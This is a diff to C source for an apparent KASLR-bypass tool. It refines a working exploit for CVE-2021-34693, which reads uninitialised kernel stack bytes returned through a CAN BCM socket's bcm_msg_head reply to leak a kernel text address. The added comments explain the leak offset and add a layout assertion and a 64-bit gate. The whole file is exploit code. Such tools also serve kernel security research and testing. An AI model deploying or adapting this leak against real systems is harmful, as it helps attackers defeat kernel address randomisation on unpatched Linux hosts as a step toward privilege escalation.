@@ -36,6 +36,7 @@
 #include <linux/can.h>
 #include <linux/can/bcm.h>
 #include <stdarg.h>
+#include <stddef.h> /* offsetof */
 #include <stdint.h>
 #include <stdio.h>
 #include <stdlib.h>
@@ -59,7 +60,16 @@ KASLD_META("method:heuristic\n"
            "config:CONFIG_CAN\n"
            "config:CONFIG_CAN_BCM\n");
 
-void rxsetup_sock(int sock) {
+/* The bcm_msg_head struct's last field `frames[]` is a C99 flexible array
+ * member, so wrapping it in a containing struct (the kernel's own pattern
+ * for sending bcm_msg_head + a fixed number of frames in one buffer) is
+ * flagged under -Wpedantic. The layout matches the kernel's expected wire
+ * format — we deliberately rely on it. Suppress the pedantic warning at
+ * the two declaration sites rather than hide the kernel-side shape. */
+#pragma GCC diagnostic push
+#pragma GCC diagnostic ignored "-Wpedantic"
+
+static void rxsetup_sock(int sock) {
   struct sockaddr_can sa;
   struct {
     struct bcm_msg_head b;
@@ -84,7 +94,7 @@ void rxsetup_sock(int sock) {
   sendto(sock, &msg, sizeof(msg), 0, (struct sockaddr *)&sa, sizeof(sa));
 }
 
-unsigned long get_kernel_addr_from_bcm_msg_head_struct() {
+static unsigned long get_kernel_addr_from_bcm_msg_head_struct(void) {
   int sock;
   struct sockaddr_can sa;
   struct {
@@ -120,19 +130,56 @@ unsigned long get_kernel_addr_from_bcm_msg_head_struct() {
 
   memcpy(buf, &msg, sizeof(buf));
 
+  /* Leak position. The pre-v5.12 BCM code constructed its reply
+   * `struct bcm_msg_head` on the kernel stack and copied it to userspace
+   * without first zeroing ival1 / ival2 / can_id (CVE-2021-34693). Those
+   * fields ride back to userspace carrying whatever kernel-stack bytes
+   * occupied that frame.
+   *
+   * The Slusarek PoC empirically reads the high half of `ival2.tv_sec`
+   * (a 64-bit `long` on LE64 kernels), where a kernel pointer reliably
+   * lands for this particular call chain. Express the offset symbolically
+   * against the struct so the position survives any future layout change
+   * and so the read site documents itself: ival2 sits at offset 32 on
+   * LE64, and +sizeof(uint32_t) selects the upper 32 bits of the 8-byte
+   * tv_sec.
+   *
+   * Gated to 64-bit hosts only. On a 32-bit kernel `long` is 4 bytes, so
+   * `bcm_timeval` is 8 bytes and `ival2` sits at a different offset; the
+   * upper-half-of-tv_sec leak shape doesn't apply. We bail rather than
+   * silently produce a non-pointer value. */
+#if __SIZEOF_LONG__ >= 8
+  _Static_assert(offsetof(struct bcm_msg_head, ival2) == 32 &&
+                     sizeof(struct bcm_timeval) == 16,
+                 "bcm_msg_head layout drift: the leak read below targets "
+                 "ival2.tv_sec's high half; recompute the offset if the "
+                 "struct moves.");
+
   if (sizeof(buf) < 112)
     return 0;
 
-  snprintf(addrs, sizeof(addrs), "%02x%02x%02x%02x", buf[39], buf[38], buf[37],
-           buf[36]);
+  const size_t leak_off =
+      offsetof(struct bcm_msg_head, ival2) /* = 32: start of ival2.tv_sec */
+      + sizeof(uint32_t); /* = 36: high half of tv_sec on LE64 */
+  snprintf(addrs, sizeof(addrs), "%02x%02x%02x%02x", buf[leak_off + 3],
+           buf[leak_off + 2], buf[leak_off + 1], buf[leak_off + 0]);
 
   addr = strtoul(addrs, &endptr, 16);
 
-  if (addr >= KERNEL_BASE_MIN && addr <= KERNEL_BASE_MAX)
+  if (addr >= KERNEL_TEXT_MIN && addr <= KERNEL_TEXT_MAX)
     return addr;
+#else
+  (void)buf;
+  (void)addrs;
+  (void)endptr;
+  (void)addr;
+  printf("[-] BCM bcm_msg_head leak shape targets a 64-bit kernel; skipping\n");
+#endif
 
   return 0;
 }
+
+#pragma GCC diagnostic pop
 
 int main(void) {
   unsigned long addr = get_kernel_addr_from_bcm_msg_head_struct();
